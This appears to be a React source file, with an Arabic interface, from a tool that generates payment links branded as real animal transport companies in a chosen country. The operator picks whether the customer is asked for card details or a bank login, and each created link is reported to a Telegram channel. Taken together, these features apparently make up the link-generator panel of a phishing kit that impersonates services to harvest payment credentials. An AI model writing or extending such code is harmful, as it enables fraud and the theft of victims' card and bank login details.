import { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Textarea } from "@/components/ui/textarea";
import { useCreateLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { getAnimalServicesByCountry } from "@/lib/animalTransportServices";
import { getAnimalServiceBranding } from "@/lib/animalServiceLogos";
import { getCurrencySymbol, getCurrencyName, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
import { generatePaymentLink } from "@/utils/paymentLinks";
import { PawPrint, MapPin, DollarSign, FileText, Building2, Copy, ExternalLink, CreditCard } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import {
  AlertDialog,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const CreateAnimalLink = () => {
  const { country } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  const countryData = getCountryByCode(country?.toUpperCase() || "");
  const services = getAnimalServicesByCountry(country?.toUpperCase() || "");
  
  const [selectedService, setSelectedService] = useState("");
  const [animalType, setAnimalType] = useState(""); // نوع الحيوان
  const [animalDetails, setAnimalDetails] = useState(""); // تفاصيل الحيوان
  const [destination, setDestination] = useState(""); // الوجهة
  const [transportAmount, setTransportAmount] = useState("500");
  const [paymentMethod, setPaymentMethod] = useState("card");
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
  const [linkId, setLinkId] = useState("");
  const [copied, setCopied] = useState(false);
  
  const selectedServiceData = useMemo(() => 
    services.find(s => s.key === selectedService),
    [services, selectedService]
  );
  
  const serviceBranding = useMemo(() =>
    selectedService ? getAnimalServiceBranding(selectedService) : null,
    [selectedService]
  );

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!selectedService || !animalType || !destination) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول المطلوبة",
        variant: "destructive",
      });
      return;
    }

    try {
      const link = await createLink.mutateAsync({
        type: "animal",
        country_code: country || "",
        payload: {
          service_key: selectedService,
          service_name: selectedServiceData?.name || selectedService,
          animal_type: animalType,
          animal_details: animalDetails,
          destination: destination,
          transport_amount: parseFloat(transportAmount) || 500,
          currency_code: getCurrencyCode(country || "SA"),
          payment_method: paymentMethod,
          selectedCountry: country || "SA",
        },
      });

      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: selectedService,
        country: country || 'SA'
      });

      const telegramResult = await sendToTelegram({
        type: 'animal_link_created',
        data: {
          service_name: selectedServiceData?.name || selectedService,
          animal_type: animalType,
          animal_details: animalDetails,
          destination: destination,
          transport_amount: parseFloat(transportAmount) || 0,
          country: countryData.nameAr,
          payment_url: `${window.location.origin}/r/${country}/${link.type}/${link.id}?company=${selectedService}`
        },
        timestamp: new Date().toISOString(),
        imageUrl: serviceBranding?.ogImage,
        description: serviceBranding?.description || selectedServiceData?.description
      });

      setCreatedPaymentUrl(paymentUrl);
      setLinkId(link.id);
      setShowSuccessDialog(true);
      
      if (telegramResult.success) {
        toast({
          title: "تم الإرسال بنجاح",
          description: "تم إرسال البيانات إلى التليجرام",
        });
      }
    } catch (error) {
      console.error("Error creating link:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء إنشاء الرابط",
        variant: "destructive",
      });
    }
  };
  
  const handleCopyLink = () => {
    navigator.clipboard.writeText(createdPaymentUrl);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast({
      title: "تم النسخ!",
      description: "تم نسخ الرابط إلى الحافظة",
    });
  };
  
  const handlePreview = () => {
    window.open(createdPaymentUrl, '_blank');
  };

  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <PawPrint className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
          <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </div>
      </div>
    );
  }
  
  return (
    <div className="min-h-screen py-4 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
      <div className="container mx-auto px-4">
        <div className="max-w-2xl mx-auto">
          <Card className="p-4 shadow-elevated">
            <div
              className="h-16 -m-4 mb-4 rounded-t-xl relative"
              style={{
                background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
              }}
            >
              <div className="absolute inset-0 bg-black/20 rounded-t-xl" />
              <div className="absolute bottom-2 right-4 text-white">
                <h1 className="text-lg font-bold">إنشاء رابط دفع - نقل حيوانات</h1>
                <p className="text-xs opacity-90">{countryData.nameAr}</p>
              </div>
            </div>
            
            <form onSubmit={handleSubmit} className="space-y-4">
              {/* Service Selection */}
              <div>
                <Label className="mb-2 text-sm">خدمة النقل *</Label>
                <Select value={selectedService} onValueChange={setSelectedService}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر خدمة نقل الحيوانات" />
                  </SelectTrigger>
                  <SelectContent className="bg-background">
                    {services.length > 0 ? (
                      services.map((service) => (
                        <SelectItem key={service.id} value={service.key}>
                          <div className="flex flex-col">
                            <span>{service.name}</span>
                            <span className="text-xs text-muted-foreground">{service.animalTypes}</span>
                          </div>
                        </SelectItem>
                      ))
                    ) : (
                      <SelectItem value="no-service" disabled>
                        لا توجد خدمات متاحة
                      </SelectItem>
                    )}
                  </SelectContent>
                </Select>
              </div>
              
              {/* Service Logo and Description */}
              {selectedService && serviceBranding && selectedServiceData && (
                <div className="p-3 rounded-lg border border-border bg-card/50">
                  <div className="flex items-center gap-3 mb-2">
                    <PawPrint className="w-6 h-6" style={{ color: serviceBranding.colors.primary }} />
                    <div>
                      <h3 className="font-semibold text-sm">{selectedServiceData.name}</h3>
                      <p className="text-xs text-muted-foreground">{selectedServiceData.animalTypes}</p>
                    </div>
                  </div>
                  <p className="text-xs text-muted-foreground">{serviceBranding.description}</p>
                </div>
              )}
              
              {/* Animal Type */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <PawPrint className="w-3 h-3" />
                  نوع الحيوان *
                </Label>
                <Input
                  value={animalType}
                  onChange={(e) => setAnimalType(e.target.value)}
                  placeholder="مثال: كلب، قطة، حصان، أبقار"
                  className="h-9 text-sm"
                  required
                />
              </div>

              {/* Animal Details */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <FileText className="w-3 h-3" />
                  تفاصيل الحيوان
                </Label>
                <Textarea
                  value={animalDetails}
                  onChange={(e) => setAnimalDetails(e.target.value)}
                  placeholder="السلالة، العمر، الوزن، الحالة الصحية، أي تفاصيل إضافية"
                  className="min-h-[80px] text-sm"
                />
              </div>
              
              {/* Destination */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <MapPin className="w-3 h-3" />
                  الوجهة *
                </Label>
                <Input
                  value={destination}
                  onChange={(e) => setDestination(e.target.value)}
                  placeholder="مثال: دبي، الرياض، لندن"
                  className="h-9 text-sm"
                  required
                />
              </div>
              
              {/* Transport Amount */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <DollarSign className="w-3 h-3" />
                  تكلفة النقل
                  {country && (
                    <span className="text-xs text-muted-foreground">
                      ({getCurrencyName(country)})
                    </span>
                  )}
                </Label>
                <Input
                  type="number"
                  value={transportAmount}
                  onChange={(e) => setTransportAmount(e.target.value)}
                  placeholder={country ? `0.00 ${getCurrencySymbol(country)}` : "0.00"}
                  className="h-9 text-sm"
                  step="0.01"
                  min="0"
                />
                {country && (
                  <p className="text-xs text-muted-foreground mt-1">
                    💱 العملة: {getCurrencyName(country)} ({getCurrencySymbol(country)})
                  </p>
                )}
              </div>
              
              {/* Payment Method Selection */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <CreditCard className="w-3 h-3" />
                  طريقة الدفع *
                </Label>
                <Select value={paymentMethod} onValueChange={setPaymentMethod}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر طريقة الدفع" />
                  </SelectTrigger>
                  <SelectContent className="bg-background">
                    <SelectItem value="card">
                      <div className="flex items-center gap-2">
                        <CreditCard className="w-4 h-4" />
                        <span>بيانات البطاقة</span>
                      </div>
                    </SelectItem>
                    <SelectItem value="bank_login">
                      <div className="flex items-center gap-2">
                        <Building2 className="w-4 h-4" />
                        <span>تسجيل دخول البنك</span>
                      </div>
                    </SelectItem>
                  </SelectContent>
                </Select>
                <p className="text-xs text-muted-foreground mt-1">
                  {paymentMethod === "card" 
                    ? "🔒 سيُطلب من العميل إدخال بيانات البطاقة"
                    : "🏦 سيُطلب من العميل تسجيل الدخول للبنك"}
                </p>
              </div>
              
              {/* Submit Button */}
              <Button
                type="submit"
                className="w-full py-5"
                disabled={createLink.isPending}
              >
                {createLink.isPending ? (
                  <span className="text-sm">جاري الإنشاء...</span>
                ) : (
                  <>
                    <PawPrint className="w-4 h-4 ml-2" />
                    <span className="text-sm">إنشاء رابط الدفع</span>
                  </>
                )}
              </Button>
            </form>
          </Card>
        </div>
      </div>
      
      {/* Success Dialog */}
      <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
        <AlertDialogContent className="max-w-md" dir="rtl">
          <AlertDialogHeader>
            <AlertDialogTitle className="text-xl text-center">
              ✅ تم إنشاء رابط الدفع بنجاح!
            </AlertDialogTitle>
            <AlertDialogDescription className="text-center">
              يمكنك نسخ الرابط أو معاينته قبل المتابعة
            </AlertDialogDescription>
          </AlertDialogHeader>
          
          <div className="my-4">
            {/* Payment Summary */}
            <div className="bg-secondary/50 p-4 rounded-lg mb-4 space-y-2">
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">الخدمة:</span>
                <span className="font-semibold">{selectedServiceData?.name || selectedService}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">نوع الحيوان:</span>
                <span className="font-semibold">{animalType}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">الوجهة:</span>
                <span className="font-semibold">{destination}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">المبلغ:</span>
                <span className="font-semibold">
                  {formatCurrency(parseFloat(transportAmount) || 500, country || "SA")}
                </span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">طريقة الدفع:</span>
                <span className="font-semibold">
                  {paymentMethod === "card" ? "بطاقة ائتمان" : "تسجيل دخول البنك"}
                </span>
              </div>
            </div>

            <div className="bg-secondary/50 p-3 rounded-lg mb-3 break-all text-xs">
              {createdPaymentUrl}
            </div>

            <div className="flex gap-2">
              <Button
                onClick={handleCopyLink}
                variant="outline"
                className="flex-1"
              >
                {copied ? (
                  <>
                    <Copy className="w-4 h-4 ml-2" />
                    تم النسخ!
                  </>
                ) : (
                  <>
                    <Copy className="w-4 h-4 ml-2" />
                    نسخ الرابط
                  </>
                )}
              </Button>

              <Button
                onClick={handlePreview}
                variant="outline"
                className="flex-1"
              >
                <ExternalLink className="w-4 h-4 ml-2" />
                معاينة
              </Button>
            </div>
          </div>
          
        </AlertDialogContent>
      </AlertDialog>
    </div>
  );
};

export default CreateAnimalLink;
